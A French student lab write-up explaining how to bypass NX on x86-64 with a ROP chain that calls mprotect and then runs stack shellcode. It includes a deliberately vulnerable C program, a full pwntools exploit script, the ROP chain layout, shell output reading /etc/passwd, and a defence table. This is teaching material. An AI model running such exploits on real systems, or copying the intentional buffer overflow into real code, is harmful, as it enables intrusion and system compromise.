# Write-up — Lab 11 : mprotect + ROP — NX Bypass via Shellcode

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![mprotect](https://img.shields.io/badge/technique-mprotect%20ROP-red.svg)]()
[![NX Bypass](https://img.shields.io/badge/NX-Bypassed-orange.svg)]()
[![Shellcode](https://img.shields.io/badge/shellcode-stack-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** NX activé — stack non-exécutable  
**Technique :** ROP → syscall `mprotect(10)` pour rendre une page exécutable → `ret` sur shellcode  
**Différence vs Lab05 :** Lab05 = ret2libc (jamais de shellcode), Lab11 = shellcode réel sur stack  
**Résultat :** Shell interactif — shellcode x64 exécuté directement depuis la stack

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6.87.2-microsoft-standard-WSL2
gcc    : -g -fno-stack-protector -no-pie
```

**checksec :**

```
Stack:  No canary found
NX:     NX enabled          ← stack non-executable
PIE:    No PIE (0x400000)
```

---

## 3. Pourquoi mprotect ?

NX empêche l'exécution de code sur la stack. `mprotect()` est un syscall Linux qui modifie les permissions d'une zone mémoire :

```c
mprotect(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC);
// PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4 → 7
```

En appelant `mprotect` via ROP avant de sauter sur le shellcode, on retire la restriction NX sur la page concernée.

---

## 4. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

__asm__(".section .text\n"           // IMPORTANT : .text avant les globals
        ".global pop_rax\npop_rax:\n\tpop %rax\n\tret\n"
        ".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n"
        ".global pop_rsi\npop_rsi:\n\tpop %rsi\n\tret\n"
        ".global pop_rdx\npop_rdx:\n\tpop %rdx\n\tret\n"
        ".global do_syscall\ndo_syscall:\n\tsyscall\n\tret\n");

void vulnerable() {
    char buffer[256];
    printf("buffer @ %p\n", buffer);  // leak adresse exacte du buffer
    fflush(stdout);
    read(0, buffer, 512);             // overflow volontaire
}

int main() { vulnerable(); return 0; }
```

---

## 5. Stratégie

```
┌─────────────────────────────────────────────────────────┐
│  buffer layout en mémoire                               │
│                                                         │
│  [shellcode 48B][NOP x216][ROP chain 80B]               │
│  ↑                                                      │
│  buf_addr (leaké par printf)                            │
└─────────────────────────────────────────────────────────┘

ROP chain :
  pop rax → 10 (SYS_mprotect)
  pop rdi → page_addr (buf_addr & ~0xfff)
  pop rsi → 0x2000 (2 pages)
  pop rdx → 7 (PROT_READ|WRITE|EXEC)
  do_syscall             ← mprotect exécuté
  buf_addr               ← ret saute sur le shellcode !
```

---

## 6. Exploit — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf
context.arch   = 'amd64'

shellcode = asm(shellcraft.sh())    # shellcode x64 : 48 bytes

p = process('./target')

# Lire l'adresse du buffer
line = p.recvline()
buf_addr  = int(line.split(b'@ ')[1].strip(), 16)
page_addr = buf_addr & ~0xfff       # aligner sur 0x1000

# ROP : mprotect → ret sur shellcode
rop = ROP(elf)
rop.raw(elf.sym['pop_rax'])   ; rop.raw(10)         # SYS_mprotect
rop.raw(elf.sym['pop_rdi'])   ; rop.raw(page_addr)
rop.raw(elf.sym['pop_rsi'])   ; rop.raw(0x2000)
rop.raw(elf.sym['pop_rdx'])   ; rop.raw(7)
rop.raw(elf.sym['do_syscall'])
rop.raw(buf_addr)                                    # jump shellcode

# Payload : shellcode + padding + ROP
OFFSET  = 264   # buffer[256] + saved RBP[8]
payload = shellcode + b'\x90' * (OFFSET - len(shellcode)) + rop.chain()

p.send(payload)
p.interactive()
```

---

## 7. Chaîne ROP

```
0x0000:  0x401176  pop_rax    → RAX = 10 (SYS_mprotect)
0x0010:  0x401178  pop_rdi    → RDI = 0x7ffc4f772000 (page alignée)
0x0020:  0x40117a  pop_rsi    → RSI = 0x2000
0x0030:  0x40117c  pop_rdx    → RDX = 7
0x0040:  0x40117e  do_syscall → mprotect() — stack devient RWX
0x0048:  0x7ffc... buf_addr   → ret saute sur shellcode
```

---

## 8. Résultat

```
[*] Shellcode size : 48 bytes
[+] buffer @ 0x7ffc4f772280
[*] page   @ 0x7ffc4f772000
[+] Shell obtenu
$ id    → uid=1000(angevirus)
$ cat /proc/version → Linux 6.6.87.2-microsoft-standard-WSL2
$ cat /etc/passwd   → lecture fichiers systeme
```

> Screenshot : [docs/lab11_mprotect_rop.png](docs/lab11_mprotect_rop.png)

---

## 9. Comparaison des techniques NX bypass

| Technique | Mécanisme | Shellcode ? |
|-----------|-----------|-------------|
| ret2libc (Lab05) | Appeler system() dans libc | Non |
| ROP chain (Lab05-09) | Gadgets libc existants | Non |
| **mprotect + ROP (Lab11)** | **Rendre la stack exécutable** | **Oui** |
| ret2syscall (Lab10) | Appel kernel direct | Optionnel |

---

## 10. Défense

| Vecteur | Mesure |
| --- | --- |
| mprotect sur la stack | Règles seccomp — interdire mprotect avec PROT_EXEC sur stack |
| Overflow | `read(0, buf, sizeof(buf))` |
| Shellcode injection | Canary + PIE + ASLR → rend buf_addr imprévisible |
| Gadgets inline asm | Compiler sans gadgets explicites |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Syscall | mprotect — numéro 10 |
| Protection contournée | NX (stack non-exécutable) |
| Shellcode | 48 bytes — `shellcraft.sh()` pwntools |
| Offset overflow | 264 bytes (buffer 256 + saved RBP 8) |
| Clé | `ret` après do_syscall saute directement sur shellcode |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
